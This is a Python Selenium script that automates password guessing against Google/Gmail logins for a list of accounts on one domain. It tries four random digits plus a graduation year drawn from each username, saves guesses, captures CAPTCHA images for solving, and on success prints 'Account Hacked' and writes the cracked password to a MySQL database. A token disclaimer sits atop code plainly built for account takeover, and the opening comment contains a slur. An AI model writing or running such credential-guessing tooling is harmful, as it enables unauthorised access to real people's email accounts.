# Disclaimer: For no reason should this code actually be used to hack into google accounts!
# Any Attempt to hack google accounts will most likely fail.
# Figure out how to bypass google gay ass protection against automation extension's
# Imports all the library's for the program including the Selenium library's
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from keras.models import load_model
from imutils import paths
from pytesseract import image_to_string
from PIL import Image
from random import *  # Imports Random Library
from helpers import resize_to_fit
from urllib import request
import numpy as np
import cv2
import pickle
import sys  # Imports System
import string  # Imports String Library
import pytesseract
import importlib
import mysql.connector  # Imports MySQL connector for pycharm
import shutil
import os
os.environ['TF_CPP_MIN_LOG_LEVEL'] = '2'
MODEL_FILENAME = "C:/Users//PycharmProjects/chromedriver_win32/captcha_model.hdf5"
MODEL_LABELS_FILENAME = "C:/Users//PycharmProjects/chromedriver_win32/model_labels.dat"
CAPTCHA_IMAGE_FOLDER = "C:/Users//PycharmProjects/chromedriver_win32/generated_captcha_images"
CAPTCHA_IMAGE = "C:/Users//PycharmProjects/chromedriver_win32/screenshot.png"
GuessedPasswords = "C:/Users//PycharmProjects/chromedriver_win32/GuessedPasswords"
'''Connects to the MySQL database "python_db" with user 'admin' and the password '' '''
mydb = mysql.connector.connect(host='localhost', database='python_db', user='admin', password='')
mycursor = mydb.cursor()
min_char = 4  # Sets minimum characters
max_char = 4  # Sets maximum characters
'''Sets "allchar" to all Lowercase & Uppercase letters & digits, sets "lowerchar" to all lowercase letters & punctuation
,sets "upperchar" to all uppercase letters, sets "digits" to all digits,and sets "octdigits" to digits 0-7.'''
allchar = string.ascii_lowercase + string.digits + string.ascii_uppercase
lowerchar = string.ascii_lowercase + string.punctuation
upperchar = string.ascii_uppercase
digits = string.digits
octdigits = string.octdigits
cnt = 0  # Declares cnt to 0
x = 1  # Declares x to 1
list = []
print("Tried Passwords:")
'''While loop that is infinite and will never stop unless Error occurs or program stopped'''
while x == 1:
    '''Declares file locations to identifiers'''
    filepath = "C:/Users//PycharmProjects/chromedriver_win32/Email List"
    backupfile = "C:/Users//PycharmProjects/chromedriver_win32/Users"
    '''When the file(Email List) is open it will set all file commands as f. In the file it will
                    read all the line in the file then it will removes all the new line commands("\n") from the list'''
    with open(filepath) as f:
        content = f.readlines()
        letters = ''.join(lowerchar)
    content = [x.strip() for x in content]
    gradyear = content[0]  # Sets variable "gradyear" to the first email in Email List
    gradyear = [x.strip(letters) for x in gradyear]  # Removes all letters from email
    gradyear = ''.join(str(e) for e in gradyear)  # Turns list into string
    '''While cnt(default value 0) is less than the length of the list "content" it will run the
    following code. Inside the while loop if content[0] equals 0 then it will remove and return the last
    value from the list. Otherwise it will set "usernameStr" to the first line in the file & adds "@gvr5.net"
    to the end of it. Then it will take the variable cnt and add 1 to it.'''
    while cnt < len(content):
        if content[cnt] == 0:
            content.pop()
        else:
            usernameStr = content[0] + "@gvr5.net"
            mysql_username = content[0]
            cnt += 1

        '''Sets the identifier "passwordStr" to a random password that will be only digits and the length of the
        password would be decided by the variables "min_char" & "max_char" it then add the "gradyear" variable to the 
        end of the password.'''
        passwordStr = "".join(choice(digits) for x in range(randint(min_char, max_char))) + gradyear
        '''Sets the identifier browser to the "webdriver.Chrome" which sets the search engine to google. It then
        gives the path to an .exe application that will open chrome. Then it sets the url for our website by using
        the identifier "browser" to open the website url in google. '''
        options = webdriver.ChromeOptions()
        options.add_argument("download.default_directory=C:/Users/Ryan DeHaan/PycharmProjects/chromedriver_win32/"
                             "generated_captcha_images")
        browser = webdriver.Chrome('C:/Users/Ryan DeHaan/PycharmProjects/chromedriver_win32/chromedriver.exe',
                                    chrome_options=options)
        browser.get(('https://accounts.google.com/ServiceLogin?'
                     'service=mail&continue=https://mail.google'
                     '.com/mail/#identifier'))
        '''Sets "username" to find the input box by finding the id('identifierID') of the input box for
         your email. It then types in the input box the variable "usernameStr" that we set to the desired
         Email. Then it finds the next button by its id('identifierNext') and then sets it to the "nextButton" 
         identifier after it finds the element it clicks the button.'''
        username = browser.find_element_by_id('identifierId')
        username.send_keys(usernameStr)
        nextButton = browser.find_element_by_id('identifierNext')
        nextButton.click()

        '''Has the variable "password" wait until the presence of the element "password" is located, it waits 10
        seconds and if it can't find the element it will return a "NoSuchElementException". If it finds the element
        it will type the variable "passwordStr" which we set to guess random digits from a minimum of 4 and maximum of 4
        Characters. It then prints the password that was inputted after that it tries to find the element "passwordNext"
        . Once the element if found it will execute a script to click the button to login.'''
        password = WebDriverWait(browser, 100).until(
            EC.presence_of_element_located((By.NAME, "password")))
        browser.implicitly_wait(5)
        for line in open(GuessedPasswords, "r+").readlines():
            info = line.split()
            print(info)
            for item in info:
                if item == passwordStr:
                    print("already Guessed:",passwordStr)
                    passwordStr = "".join(choice(digits) for x in range(randint(min_char, max_char))) + gradyear
        password.send_keys(passwordStr)
        fo = open(GuessedPasswords, "a+")
        fo.write(passwordStr + " ")
        fo.close()

        signInButton = browser.find_element_by_id('passwordNext')
        browser.execute_script("arguments[0].click();", signInButton)



        def get_captcha_text(location, size):
            pytesseract.pytesseract.tesseract_cmd = 'C:/Program Files/Tesseract-OCR/tesseract.exe'
            im = Image.open('screenshot.png')  # uses PIL library to open image in memory

            left = location['x']
            top = location['y']
            right = location['x'] + size['width']
            bottom = location['y'] + size['height']

            im = im.crop((left, top, right, bottom))  # defines crop points
            im.save("screenshot.png")
            os.chdir("C:/Users/Ryan DeHaan/PycharmProjects/chromedriver_win32/")
            renFolder = 'generated_captcha_images'
            oldname = 'screenshot.png'
            newname = "".join(choice(digits) for x in range(randint(min_char, max_char))) + '.png'
            shutil.move(oldname, renFolder + '/' + newname)
            return 'Captcha Saved'


        def login_to_website():
            global wait
            element = browser.find_element_by_id(
                "captchaimg")  # find part of the page you want image of
            location = element.location
            size = element.size
            browser.save_screenshot('screenshot.png')
            captcha = browser.find_element_by_name('ca')
            captcha.clear()
            captcha_text = get_captcha_text(location, size)


        '''Tries to find "Wrong Password Error" & if it can't it returns a "Timeout Exception" that
                checks to see if the password was correct.'''
        try:
            # Waits 5 seconds until "Wrong Password Error" otherwise it will return a "Timeout Exception"
            wait = WebDriverWait(browser, 5).until(
                EC.visibility_of_element_located((By.CLASS_NAME, "EjBTad")))  # Class name changes Sometimes
            # Finds the "Wrong Password Error" text and sets it to the variable elem
            elem = browser.find_element_by_class_name("EjBTad").text
            passwordFound = False
            browser.quit()
        # If "Timeout Exception" returned by "try:" statement this code will run
        except TimeoutException:
            # Checks to see that page has fully loaded and if it is prints "Account Hacked"
            if browser.current_url == "https://mail.google.com/mail/u/0/#inbox":
                print("Account Hacked")
                open(GuessedPasswords, 'w').close()
                passwordFound = True
                '''Stores the correct user password under the users username in the MySQL database "python_db" '''
                mycursor.execute("UPDATE accounts SET password =%s WHERE name =%s", (passwordStr, mysql_username))
                mycursor.close()
                mydb.commit()
                mydb.close()
                # Ask user if they would like to Reset Email list
                userinput = input("Reset Email List?:")
                '''If the user inputs "yes" or "Yes" it will load the backup file then it read every line in the file
                then store it in the identifier "upload" then it removes all the "\n" in the list then stores the 
                 list as a string in the identifier "download".'''
                if userinput == "yes" or userinput == "Yes":
                    with open(backupfile, "r+") as f:
                        upload = f.readlines()
                    upload = [x.strip() for x in upload]
                    download = '\n'.join(upload)
                    '''Opens "Email List" in writing mode then writes the "download" string which we set to the
                    "Backup Emails" file contents, this resets the "Email List" then after it writes to the file it
                     close all the browser tabs and stops the program.'''
                    with open(filepath, "w+") as f:
                        f.write(download)
                        browser.quit()
                        sys.exit()
                elif userinput == "no" or userinput == "No":  # If the user inputs "no" or "No" Then it
                    # will run the following code
                    browser.quit()  # Closes all the browser tabs
                    '''When the file(Email List) is open it will set all file commands as f. In the file it will
                    read all the line in the file then it will removes all the new line commands("\n") from the list.'''
                    with open(filepath) as f:
                        content = f.readlines()
                    content = [x.strip() for x in content]
                    '''While cnt(default value 0) is less than the length of the list "content" it will run the
                    following code. Inside the while loop if content[0] equals 0 then it will remove and return the last
                    value from the list. Otherwise it will open the "Email List" file in reading mode and will read all
                     the lines from the file. Then it will open the file again but in writing mode, for every line in 
                     the file it will remove the new line command and checks to see if it is not the first line in the
                     file then it deletes the top Email from the file.'''
                    while cnt < len(content):
                        if content[cnt] == 0:
                            content.pop()
                        else:
                            with open(filepath, "r+") as f:
                                lines = f.readlines()
                            with open(filepath, "w+") as f:
                                for line in lines:
                                    if line.strip("\n") != content[0]:
                                        f.write(line)
                        browser.quit()
                        sys.exit()
                else:  # If user doesn't enter ether "yes" or "no" then it will execute the code
                    print("Please Input Valid Option(Yes or No)")  # Tells user to input right option
                    sys.exit()  # Completely stops the program
            elif browser.current_url == "https://accounts.google.com/signin/v2/sl/pwd?service=mail&continue=https%3A%2"\
                                        "F%2Fmail.google.com%2Fmail%2F&flowName=GlifWebSignIn&flowEntry=ServiceLogin&c"\
                                        "id=1&navigationDirection=forward":  # Checks if current url is the login page
                '''Waits until is see a captcha then it will print "Captcha Loaded". It then prints "Closing program"
                then it will close all browser tabs and stop the program. Otherwise it will print a 704 Error if 
                both if else statements aren't true meaning the url is different than the expected urls.'''
                wait = WebDriverWait(browser, 10).until(
                    EC.visibility_of_element_located((By.NAME, "ca")))
                login_to_website()
            else:
                print("Error 704")
                sys.exit()
